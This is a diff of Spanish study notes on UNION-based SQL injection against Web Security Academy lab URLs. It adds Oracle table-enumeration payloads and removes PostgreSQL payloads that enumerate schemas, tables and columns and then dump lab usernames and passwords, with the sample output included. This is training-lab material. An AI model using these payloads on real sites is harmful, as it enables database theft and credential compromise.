@@ -79,35 +79,17 @@ SELECT table_name FROM all_tables WHERE owner = 'PETER';
 
     ### Enumer Tablas:
 
-# Utilizar sintaxis Oracle para enumerar:
+# TODAS: Utilizar sintaxis Oracle para enumerar Tablas:
+.web-security-academy.net/filter?category=-Pets' Union Select '1',table_name FROM all_tables -- -
+# Filtrando por User: A diferencia de MySQL es mejor enumerar tablas por propietario:
+.web-security-academy.net/filter?category=-Pets' Union Select '1',table_name FROM all_tables WHERE owner = 'PETER' -- -
+        ## PRODUCTS
+        ## USERS_GZGVRP
+
+    ### Enumer Columnas:
 
 
 
 
 
-
-
-
-## Dumpear la base de Datos:
-.web-security-academy.net/filter?category=-Pets' Union Select '1',schema_name FROM information_schema.schemata -- -
-    # information_schema
-    # public
-    # pg_catalog
-
-## Dumpear el Nombre de las Tablas:
-.web-security-academy.net/filter?category=-Pets' Union Select '1',table_name FROM information_schema.tables WHERE table_schema = 'public' -- -
-    # products
-    # users_tcaine
-
-## Dumpear el Nombre de las Columnas:
-.web-security-academy.net/filter?category=-Pets' Union Select '1',column_name FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users_tcaine' -- -
-    # password_wyuxxb
-    # username_fzanak
-
-## Dumpear los Datos
-.web-security-academy.net/filter?category=-Pets' Union Select '1',concat(password_wyuxxb,' ::: ',username_fzanak) from users_tcaine -- -
-.web-security-academy.net/filter?category=-Pets' Union Select '1',password_wyuxxb||' : '||username_fzanak from users_tcaine -- -
-    # ybh5rrmndjm9grpgaac3 ::: administrator
-    # f18xc226xxi0tb4g9zpv ::: carlos
-    # onix1tykwp2vvyphg0gb ::: wiener
 ````
